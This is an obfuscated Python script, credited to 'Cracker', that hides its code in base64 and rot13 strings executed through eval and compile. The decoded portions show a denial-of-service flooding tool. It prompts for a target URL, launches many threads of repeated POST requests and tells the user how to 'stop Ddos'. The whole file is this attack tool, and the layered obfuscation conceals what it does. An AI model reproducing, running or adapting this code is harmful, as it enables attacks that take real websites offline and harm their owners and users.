# Coded by Cracker
# CRACKER911181




import base64, codecs
magic = 'aW1wb3J0IHRocmVhZGluZwppbXBvcnQgcmFuZG9tIAppbXBvcnQgcmVxdWVzdHMsb3Msc3lzLHRpbWUKCgojdGV4dCBjb2xvdXIoKQojY3JlYXRvcjogQ1JBQ0tFUjkxMTE4MQoKI1RleHQgY29sb3VyCiNjcmVhdGVkIEJ5IENyYWNrZXI5MTExODEKY29sb3Vyb2ZmPSJceDFiWzAwbSIgI2NvbG91ciBvZmYKCnJlZD0iXHgxYls5MW0iICNyZWQKZ3JlZW49Ilx4MWJbOTJtIiAjZ3JlZW4KeWVsbG93PSJceDFiWzkzbSIgI3llbGxvdwpibHVlPSJceDFiWzk0bSIgI2JsdWUKcm9zeT0iXHgxYls5NW0iICNyb3N5CnBlc3Q9Ilx4MWJbOTZtIiAjcGVzdAoKCgp0eXBlID0gJycKCgoKZGF0YXMgPSByYW5kb20uX3VyYW5kb20oMTQ5MCkKbWFpbl91cmwgPSAnJwoKZGVmIGNoZWNrKCk6Cgl1cmwgPSBzdHIoaW5wdXQocm9zeSsiXG5cbkVudGVyIFlvdXIgVVJMOiAiK2NvbG91cm9mZikpCgkjdXJsID0gdXJsLnJlcGxhY2UoJ2h0dHBzOi8vJywnaHR0cDovLycpCgoJZ2xvYmFsIHR5cGUsbWFpbl91cmwKCXggPSByZXF1ZXN0cy5wb3N0KHVybCxkYXR'
love = 'uCJEuqTSmXDbWnJLtrP5mqTS0qKAsL29xMG09ZwNjBtbWPKE5pTHtCFNvpT9mqPVXPDygLJyhK3IloPN9VUIloNbWMJkmMGbXPDy0rKOyVQ0tW2qyqPpXPDygLJyhK3IloPN9VUIloPfvClVep3ElXTEuqTSmXDbXPzEyMvOlMKRbXGbXPJEuqTRtCFOxLKEupjbWqUW5BtbWPKqbnJkyVSElqJH6PtxWPKElrGbXPDxWPJyzVUE5pTH9CFqjo3A0WmbXPDxWPDylMKS1MKA0pl5jo3A0XT1unJ5sqKWfYTEuqTR9MTS0LFxXPDxWPJIfp2H6PtxWPDxWpzIkqJImqUZhM2I0XT1unJ5sqKWfXDbWPDxWpUWcoaDbpzIxXlWlMKS1MKA0plOmMJ5xVvxXPDxWMKuwMKO0BtbWPDxWpTSmpjbWPtyyrTAypUD6PtxWpTSmpjbWPtcxMJLtoJScozIlXPx6PtxXPFVvVaEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CKWypFxhp3EupaDbXFVvVtbWMKuyLlugLJyhMKVhK19xo2AsKlxXPtbXMTIzVT1unJ4bXGbXPKElrGbXPDywnTIwnltcPtxWqTulMJDtCFOcoaDbnJ5jqKDbpz9mrFfvKT5SoaEypvOHnUWyLJDtDJ1iqJ50BvNvX2AioT91pz9zMvxcPtxWMz9lVS8tnJ4tpz'
god = 'FuZ2UodGhyZWQgLSAxKToKCQkJbWFpbmVyLl9fZG9jX189bWFpbmVyLl9fZG9jX18rIlxudGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cmVxKS5zdGFydCgpIgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KCJcblxuXHRUbyBzdG9wIERkb3MgcHJlc3MgKGN0ICsgeilcblxuIikKCQltYWluZXIoKQoJCglleGNlcHQgVmFsdWVFcnJvcjoKCQlwcmludChlKQoJCXByaW50KHJlZCsiXG5cblx0XHRTb21ldGhpbmcgd2VudCB3cm9uZyEiKQoJCWlucHV0KGJsdWUrIlxuXG4gICAgICAgUHJlc3MgRW50ZXIgVG8gQmFjayBQcmV2aW91cyBNZW51ICIpCgoKCgp3aGlsZSBUcnVlOgoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludChibHVlK2YiIiIKICAgX19fXyAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICBfCiAgLyBfX198XyBfXyBfXyBfICBfX198IHwgX19fX18gXyBfXyAgIHxfICAgX3xfXyAgIF9fXyB8IHwKICIiIitibHVlKyIiInwgfCAgIHwgJ19fLyBfYCB8LyBfX3wgfC8gLyBfIFwgJ19ffF9fX'
destiny = '198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVPNtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqPNtVPNtVPNtVPVvVvgvoUIyXlVvVyivzVIqVRAfo3IxMzkupzHtERECHlOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXPDbWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF5RER9GVRS0qTSwn1khKUEpqPVepzIxXlVjZP5PLJAeVSEiVRuioJIpoykhVvglo3A5XlWSoaEypvOMo3IlVR9jqTyiowbtVvxcPtxXPJyzVTAbo3AyVQ09VPVkVwbXPDxXPDygLJyhXPxXPDyvpzIunjbWPtxWPtyyoTyzVTAbo3AyVQ09VPVjZPV6PtxWLaWyLJf='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
